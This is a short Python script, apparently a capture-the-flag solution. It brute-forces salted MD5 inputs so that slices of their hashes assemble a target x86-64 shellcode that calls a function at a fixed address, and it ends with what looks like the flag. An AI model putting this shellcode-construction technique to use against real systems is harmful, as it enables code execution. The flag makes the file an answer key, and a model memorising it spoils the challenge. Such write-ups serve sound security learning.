from pwn import *
import hashlib

'''
mov rsi, rdi
mov rdi, 0x7b3dc26f1
call rsi
'''
salt = 'GpLaMjEWpVOjnnmkRGiledp6Mvcezxls'
desiredShellCode = b"H\x89\xfeH\xbf\xf1&\xdc\xb3\x07\x00\x00\x00\xff\xd6\x90"


def calcPart(text, idx):

    hashText = hashlib.md5(text.encode()).digest()
    shellcode = hashText[idx:idx+4]
    return shellcode

def makeText(userInput, idx):

    text = ''
    text += userInput
    text += salt[idx:idx+8]
    return text

def check(shellcode, idx):

    if shellcode[:4] == desiredShellCode[idx:idx+4]:
        return True
    return False

def bruteForce(idx1, idx2, idx3):

    alphabet = "ABCDEFGHIJKLMNOQRSTUVWXYZabcdefghijklmnoqrstuvwxyz1234567890"	
    
    found = False
    for c_1 in alphabet:
        for c_2 in alphabet:
            for c_3 in alphabet:
                for c_4 in alphabet:

                    try_this = c_1+c_2+c_3+c_4
                    text = makeText(try_this, idx1)
                    shellCode = calcPart(text, idx2)
                    found = check(shellCode, idx3)
                    if found == True:
                        print(try_this)
                        print(text)
                        print(shellCode)
                        break


bruteForce(0, 8, 0)
bruteForce(8, 2, 4)
bruteForce(16, 7, 8)
#bruteForce(24, 1, 12)

'''D1v1d3AndC0nqu3r'''
